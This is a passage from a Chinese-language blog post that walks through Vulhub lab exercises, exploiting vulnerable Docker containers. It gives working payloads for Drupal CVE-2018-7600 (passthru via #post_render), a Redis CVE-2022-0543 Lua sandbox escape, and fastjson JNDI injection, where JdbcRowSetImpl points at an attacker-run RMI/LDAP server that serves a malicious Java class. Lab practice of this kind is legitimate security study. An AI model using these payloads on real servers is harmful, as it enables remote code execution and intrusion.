class="line">user_register_form</span><br><span class="line">-----------------------------99533888113153068481322586663</span><br><span class="line">Content-Disposition: form-data; name=&quot;_drupal_ajax&quot;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171555374.png" alt="image-20240617155523293"></p>
<p>or</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: ip地址:8083</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=passthru&amp;mail[#type]=markup&amp;mail[#markup]=id</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171603184.png" alt="image-20240617160312135"></p>
<p>利用了Drupal的渲染数组注入漏洞，通过<code>#post_render</code>参数注入PHP命令执行函数</p>

        <h1 id="redis未授权访问漏洞"   >
          <a href="#redis未授权访问漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1>
      
        <h2 id="CVE-2022-0543"   >
          <a href="#CVE-2022-0543" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2022-0543" class="headerlink" title="CVE-2022-0543"></a>CVE-2022-0543</h2>
      <p>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象<code>package</code>，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令。</p>
<p>docker启动后，使用以下命令连接到redis服务器</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip地址 -p 6379</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171619794.png" alt="image-20240617161955754"></p>
<p>借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令</p>
<figure class="highlight lua"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;ls /&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>

<p>使用<code>io.popen</code>来执行一个系统命令并读取其输出，这个代码片段的具体功能是获取并返回执行<code>ls /</code>命令的结果</p>
<p>不同环境下的liblua库路径不同，需要指定一个正确的路径，在该环境中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code></p>
<p>使用<code>eval</code>命令执行上述脚本</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f</span></span><br><span class="line"><span class="string">(&quot;*a&quot;); f</span></span><br><span class="line"><span class="string">(); return res&#x27;</span> 0</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406171630268.png" alt="image-20240617163045225"></p>
<p>成功执行命令<code>ls /</code></p>

        <h1 id="fastjson"   >
          <a href="#fastjson" class="heading-link"><i class="fas fa-link"></i></a><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1>
      
        <h2 id="1-2-24"   >
          <a href="#1-2-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2>
      <p>在E:\靶场\vulhub-master\fastjson\1.2.24-rce目录下打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></div></figure>

<p>运行界面图为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302030232.png" alt="image-20240530203035187"></p>
<p>运行之后新建一个TouchFile.java文件，写入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success.txt&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在该java文件夹目录下打开终端，编译这个文件</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></div></figure>

<p>就能看到该目录下已经有了一个.class文件</p>
<p>python开启http服务</p>
<p>终端输入</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></div></figure>

<p>可以访问一下这个网页看是否开启成功</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8000</span><br><span class="line">//ip地址也可以为本机ip地址</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302023728.png"></p>
<p>可以看到文件目录下有这么些文件</p>
<p>借助marshalsec项目开启RMI服务<br>marshalsec:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec" >https://github.com/mbechler/marshalsec</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>下载完marshalsec之后，进到该目录下打开终端运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></div></figure>

<p>会生成一个target文件夹，里面又一个marshalsec-0.0.3-SNAPSHOT-all.jar文件说明已经配置成功了</p>
<p>在target文件夹内打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://本机ip地址:8000/#TouchFile&quot;</span> </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302029680.png" alt="image-20240530202944628"></p>
<p>然后抓包（这个靶场的运行界面的包）发送到Repeater</p>
<p>修改请求头为POST，添加Content-Type为application/json，添加参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://本机ip地址:1099/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p><code>com.sun.rowset.JdbcRowSetImpl</code> 是 Java 的一部分，属于 <code>javax.sql.rowset</code> 包。这个类实现了 <code>JdbcRowSet</code> 接口，提供了一个封装数据库结果集的 Java Bean 组件。关键的问题是，这个类在处理特定的属性（如 <code>dataSourceName</code>）时，可以触发 Java 的 JNDI服务，这可能会导致远程代码执行</p>
<p><code>dataSourceName</code> 属性被用于指定 JNDI 查找的地址。在正常情况下，这应该是数据库的位置，但在攻击场景中，这个地址被设置为恶意的 RMI服务器地址</p>
<p>当 Fastjson 创建 <code>JdbcRowSetImpl</code> 实例并设置其 <code>dataSourceName</code> 时，该实例会尝试连接到提供的 JNDI 地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302040219.png" alt="image-20240530204018163"></p>
<p>发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302041342.png" alt="image-20240530204111289"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405310920378.png" alt="image-20240531092032273"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405311120287.png" alt="image-20240531112056134"></p>
<p>查看容器内的文件</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">//查看容器内内容的id号</span><br></pre></td></tr></table></div></figure>

<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id号 /bin/bash</span><br><span class="line">//进入该容器</span><br></pre></td></tr></table></div></figure>

<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /tmp</span><br><span class="line">//查看该文件夹下的文件</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405302043378.png" alt="image-20240530204334328"></p>

        <h2 id="1-2-47"   >
          <a href="#1-2-47" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2>
      <p>方法同1.2.24</p>
<p>请求包的参数部分内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://pidan-007.github.io">PiDan-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://pidan-007.github.io/2024/05/30/Vulhub/">https://pidan-007.github.io/2024/05/30/Vulhub/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://pidan-007.github.io/tags/Vulhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">Vulhub靶场练习</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/06/07/WEB%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">WEB漏洞</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/05/30/WebBug%E9%9D%B6%E5%9C%BA/"><span class="paginator-prev__text">WebBug-学习</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#activemq"><span class="toc-number">1.</span> <span class="toc-text">
          activemq</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-5254"><span class="toc-number">1.1.</span> <span class="toc-text">
          CVE-2015-5254</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-41678"><span class="toc-number">1.2.</span> <span class="toc-text">
          CVE-2022-41678</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Adminer"><span class="toc-number">2.</span> <span class="toc-text">
          Adminer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-21311"><span class="toc-number">2.1.</span> <span class="toc-text">
          CVE-2021-21311</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#apache-druid"><span class="toc-number">3.</span> <span class="toc-text">
          apache-druid</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-25646"><span class="toc-number">3.1.</span> <span class="toc-text">
          CVE-2021-25646</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#django"><span class="toc-number">4.</span> <span class="toc-text">
          django</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-Trunc-kind-and-Extract-lookup-name-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-34265%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">
          Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-QuerySet-order-by-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-35042%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">
          Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-JSONField-HStoreField-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-14234%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">
          Django JSONField&#x2F;HStoreField SQL注入漏洞（CVE-2019-14234）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#geoserver"><span class="toc-number">5.</span> <span class="toc-text">
          geoserver</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GeoServer%E5%B1%9E%E6%80%A7%E5%90%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-36401%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">
          GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ghostscript"><span class="toc-number">6.</span> <span class="toc-text">
          Ghostscript</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GhostScript%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9ECVE-2018-16509"><span class="toc-number">6.1.</span> <span class="toc-text">
          GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GhostScript%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-19475%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">
          GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GhostScript%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6116%EF%BC%89"><span class="toc-number">6.3.</span> <span class="toc-text">
          GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jmeter"><span class="toc-number">7.</span> <span class="toc-text">
          jmeter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-JMeter-RMI-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1297%EF%BC%89"><span class="toc-number">7.1.</span> <span class="toc-text">
          Apache JMeter RMI 反序列化命令执行漏洞（CVE-2018-1297）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jimureport"><span class="toc-number">8.</span> <span class="toc-text">
          jimureport</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JimuReport-FreeMarker%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCVE-2023-4450"><span class="toc-number">8.1.</span> <span class="toc-text">
          JimuReport FreeMarker服务端模板注入命令执行CVE-2023-4450</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Joomla"><span class="toc-number">9.</span> <span class="toc-text">
          Joomla</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Joomla-3-4-5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECVE-2015-8562"><span class="toc-number">9.1.</span> <span class="toc-text">
          Joomla 3.4.5反序列化漏洞CVE-2015-8562</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring"><span class="toc-number">10.</span> <span class="toc-text">
          Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-WebFlow-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-4971%EF%BC%89"><span class="toc-number">10.1.</span> <span class="toc-text">
          Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">10.1.0.0.1.</span> <span class="toc-text">
          漏洞验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">10.1.0.0.2.</span> <span class="toc-text">
          反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-Security%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2022-22978"><span class="toc-number">10.2.</span> <span class="toc-text">
          Spring Security身份验证绕过漏洞(CVE-2022-22978)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat"><span class="toc-number">11.</span> <span class="toc-text">
          Tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-12615"><span class="toc-number">11.1.</span> <span class="toc-text">
          CVE-2017-12615</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%82%B9%EF%BC%9A%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">11.1.0.0.0.1.</span> <span class="toc-text">
          关键点：绕过文件上传限制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D%E5%90%8E%E5%8A%A0-%E5%8F%AF%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E7%BC%80%E5%8A%A0-DATA%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E5%8A%A0%E4%B8%8A-20%EF%BC%8C%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E7%BC%80%E5%8A%A0%E4%B8%8A"><span class="toc-number">11.1.0.0.0.2.</span> <span class="toc-text">
          后缀名后加&#x2F;可绕过上传，文件名后缀加::$DATA，上传文件后缀名加上%20，上传文件名后缀加上.</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pgadmin"><span class="toc-number">12.</span> <span class="toc-text">
          Pgadmin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pgAdmin-lt-6-16%E6%97%A0%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2022-4223"><span class="toc-number">12.1.</span> <span class="toc-text">
          pgAdmin&lt;&#x3D;6.16无授权远程命令执行漏洞CVE-2022-4223</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP"><span class="toc-number">13.</span> <span class="toc-text">
          PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#imap-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2018-19518"><span class="toc-number">13.1.</span> <span class="toc-text">
          imap 远程命令执行漏洞CVE-2018-19518</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-number">13.1.0.0.0.1.</span> <span class="toc-text">
          解释</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-1"><span class="toc-number">13.1.0.0.1.</span> <span class="toc-text">
          反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro"><span class="toc-number">14.</span> <span class="toc-text">
          Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2010-3863"><span class="toc-number">14.1.</span> <span class="toc-text">
          CVE-2010-3863</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1957"><span class="toc-number">14.2.</span> <span class="toc-text">
          CVE-2020-1957</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#struts2"><span class="toc-number">15.</span> <span class="toc-text">
          struts2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-045"><span class="toc-number">15.1.</span> <span class="toc-text">
          s2-045</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81"><span class="toc-number">15.1.0.0.1.</span> <span class="toc-text">
          验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">15.1.0.0.2.</span> <span class="toc-text">
          使用工具连接反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apisix"><span class="toc-number">16.</span> <span class="toc-text">
          Apisix</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-13945"><span class="toc-number">16.1.</span> <span class="toc-text">
          CVE-2020-13945</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Drupal-Drupalgeddon-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.</span> <span class="toc-text">
          Drupal Drupalgeddon 2远程代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-7600"><span class="toc-number">17.1.</span> <span class="toc-text">
          CVE-2018-7600</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.</span> <span class="toc-text">
          redis未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-0543"><span class="toc-number">18.1.</span> <span class="toc-text">
          CVE-2022-0543</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson"><span class="toc-number">19.</span> <span class="toc-text">
          fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-24"><span class="toc-number">19.1.</span> <span class="toc-text">
          1.2.24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47"><span class="toc-number">19.2.</span> <span class="toc-text">
          1.2.47</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">14</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PiDan-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> 